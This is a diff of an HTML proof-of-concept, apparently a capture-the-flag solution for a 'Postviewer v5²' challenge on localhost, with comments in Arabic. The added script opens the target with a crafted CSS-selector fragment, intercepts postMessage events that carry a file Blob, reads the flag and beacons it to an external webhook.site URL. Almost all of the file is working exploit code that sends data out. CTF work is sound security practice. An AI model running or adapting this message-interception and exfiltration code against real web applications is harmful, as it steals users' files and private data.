@@ -1,7 +1,30 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Postviewer v5² stealer</title>
+<title>Postviewer v5² — PoC</title>
 <script>
+(async () => {
+  /* 1. افتح التحدّي مع CSS-selector يستهدف أول عنصر (عادة flag.txt) */
+  const win = window.open(
+    'http://localhost:1338/#a,.list-group-item:nth-child(1)',
+    '_blank'
+  );
 
-fetch('https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23');
+  /* 2. استمع للرسالة التي تحتوي على الـ Blob */
+  window.addEventListener('message', async (e) => {
+    if (!e.data?.files) return;            // رسالة غير مهمّة
+    const blob = e.data.files[0]?.blob;
+    if (!blob) return;
+
+    const flag = await blob.text();        // حوِّل Blob إلى نص
+    /* 3. أرسِل العلم إلى Webhook (أو استخدم sendBeacon) */
+    navigator.sendBeacon(
+      'https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23',
+      new Blob([flag], {type:'text/plain'})
+    );
+    console.log('[+] FLAG =', flag);       // لفضولك
+  });
+
+  /* إبقِ النافذة مفتوحة قليلاً كي تُرسل الرسالة */
+  setTimeout(() => win?.close?.(), 8000);
+})();
 </script>
